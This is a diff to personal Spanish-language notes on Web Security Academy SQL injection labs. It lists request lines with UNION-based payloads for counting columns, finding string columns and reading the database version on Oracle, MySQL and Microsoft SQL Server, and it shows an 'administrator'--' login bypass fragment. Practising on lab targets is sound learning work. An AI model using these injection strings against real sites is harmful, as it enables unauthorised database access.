@@ -23,3 +23,16 @@ administrator'--
 3º LABOTATORIO >>
 
 GET https://0aa700ad0316c1aa807f08c000820069.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories' UNION+SELECT+BANNER,+NULL+FROM+v$version-- HTTP/2
+
+LABORATORIO >> SQL injection UNION attack, determining the number of columns returned by the query
+
+  GET /filter?category=Gifts' AND 1=1-- HTTP/2 -> no sé que hace, creo que comprobar si se puede hacer injection
+  GET /filter?category=Gifts' UNION SELECT NULL,NULL,NULL-- HTTP/2 -> determinar cuantas columnas tiene
+  GET /filter?category=Accessories' UNION SELECT NULL,'fLseYn',NULL-- HTTP/2 -> Con el string que te da, comprobar que existe
+
+LABORATORIO >> SQL injection attack, querying the database type and version on MySQL and Microsoft
+
+  GET /filter?category=Corporate+gifts'+UNION+SELECT+@@version,+NULL# HTTP/2
+
+
+
